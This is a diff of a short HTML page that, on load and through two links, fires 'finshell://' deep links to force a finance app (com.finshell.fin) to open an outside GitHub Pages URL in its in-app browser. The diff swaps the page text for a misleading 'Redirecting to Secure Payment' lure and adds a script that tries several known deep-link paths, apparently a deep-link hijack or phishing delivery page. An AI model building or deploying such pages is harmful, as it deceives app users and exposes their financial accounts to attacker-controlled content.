@@ -1,21 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Checking System...</title>
-    <meta http-equiv="refresh" content="0;url=finshell://web?url=https://yazidtokyo43.github.io/oppo-tes/index.html">
+    <title>Redirecting to Secure Payment...</title>
 </head>
-<body style="text-align: center; font-family: Arial, sans-serif; padding-top: 50px;">
-    <h2>Processing...</h2>
-    <p>If the app doesn't open automatically, 
-       <a href="finshell://web?url=https://yazidtokyo43.github.io/oppo-tes/index.html" 
-          style="color: blue; font-weight: bold; font-size: 20px;">
-          Click Here to Continue
-       </a>
-    </p>
+<body style="text-align: center; padding-top: 50px; font-family: sans-serif;">
+    <h2>Processing Secure Connection...</h2>
+    <p>Please wait while we redirect you to the app.</p>
+    
+    <a href="finshell://web?url=https://yazidtokyo43.github.io/oppo-tes/index.html" id="link1" style="display:block; margin:20px; font-size:20px; color:blue;">Click here to open Finshell (Option 1)</a>
+    <a href="finshell://finstar/web?url=https://yazidtokyo43.github.io/oppo-tes/index.html" id="link2" style="display:block; margin:20px; font-size:20px; color:blue;">Click here to open Finshell (Option 2)</a>
 
     <script>
-        // محاولة التحويل عبر الجافاسكريبت لضمان العمل على جميع المتصفحات
-        window.location.href = "finshell://web?url=https://yazidtokyo43.github.io/oppo-tes/index.html";
+        // محاولة التحويل التلقائي لعدة مسارات مشهورة لـ com.finshell.fin
+        const urls = [
+            "finshell://web?url=https://yazidtokyo43.github.io/oppo-tes/index.html",
+            "finshell://finstar/web?url=https://yazidtokyo43.github.io/oppo-tes/index.html"
+        ];
+        
+        urls.forEach(url => {
+            window.location.href = url;
+        });
     </script>
 </body>
 </html>
